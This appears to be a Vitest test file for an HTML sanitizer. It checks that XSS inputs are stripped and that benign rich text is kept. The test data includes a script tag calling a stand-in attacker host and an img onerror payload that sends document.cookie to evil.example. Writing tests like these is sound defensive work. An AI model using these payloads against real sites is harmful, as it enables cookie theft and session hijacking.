import { describe, it, expect } from 'vitest';
import { sanitizeHtml } from './sanitize';

describe('sanitizeHtml', () => {
  it('strips <script> payloads', () => {
    const out = sanitizeHtml('<p>hi</p><script>fetch("https://evil.example")</script>');
    expect(out).toContain('<p>hi</p>');
    expect(out).not.toContain('<script');
    expect(out).not.toContain('fetch(');
  });

  it('strips event-handler attributes (img onerror)', () => {
    const out = sanitizeHtml('<img src=x onerror="fetch(\'https://evil.example/c?\'+document.cookie)">');
    expect(out).not.toContain('onerror');
    expect(out).not.toContain('document.cookie');
  });

  it('neutralizes javascript: hrefs', () => {
    const out = sanitizeHtml('<a href="javascript:alert(1)">click</a>');
    expect(out).not.toContain('javascript:');
  });

  it('strips SVG onload payloads', () => {
    const out = sanitizeHtml('<svg onload="alert(1)"></svg>');
    expect(out).not.toContain('onload');
    expect(out).not.toContain('<svg');
  });

  it('preserves benign rich text', () => {
    const input = '<p><strong>bold</strong> and <a href="https://example.com">a link</a></p><ul><li>one</li></ul>';
    const out = sanitizeHtml(input);
    expect(out).toContain('<strong>bold</strong>');
    expect(out).toContain('href="https://example.com"');
    expect(out).toContain('<li>one</li>');
  });

  it('returns empty string for falsy input', () => {
    expect(sanitizeHtml(undefined)).toBe('');
    expect(sanitizeHtml(null)).toBe('');
    expect(sanitizeHtml('')).toBe('');
  });
});
